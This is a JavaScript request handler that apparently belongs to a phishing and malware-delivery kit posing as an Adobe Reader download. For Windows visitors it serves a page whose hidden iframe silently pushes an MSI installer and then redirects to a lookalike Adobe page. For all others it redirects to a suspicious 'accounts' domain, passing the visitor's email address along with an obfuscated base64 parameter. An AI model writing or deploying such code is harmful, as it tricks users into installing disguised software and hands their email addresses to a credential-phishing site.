import fs from 'fs';
import path from 'path';

export default function handler(req, res) {
  const userAgent = req.headers['user-agent'] || "";
  const isWindows = /windows/i.test(userAgent);

  if (isWindows) {
    // Serve the MSI download and redirect as before
    const html = `
      <!DOCTYPE html>
      <html>
        <head>
          <meta charset="UTF-8">
          <title>Download</title>
        </head>
        <body>
          <p>Your download will start shortly...</p>
          <script>
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = '/Reader_en_install.msi';
            document.body.appendChild(iframe);

            setTimeout(() => {
              window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
            }, 3000);
          </script>
        </body>
      </html>
    `;
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(html);
  } else {
    // Extract email from query string
    const url = new URL(req.url, 'http://localhost');
    const email = url.searchParams.get('email');
    let redirectUrl = 'https://accounts.bsmszq.icu?BTqoJQbzww=aHR0cHM6Ly9oZWxweC5hZG9iZS5jb20vY2EvYWNyb2JhdC9rYi9jYW50LW9wZW4tcGRmLmh0bWw=';

    // If email exists, append to redirect
    if (email) {
      redirectUrl += `&email=${encodeURIComponent(email)}`;
    }

    res.writeHead(302, { Location: redirectUrl });
    res.end();
  }
}
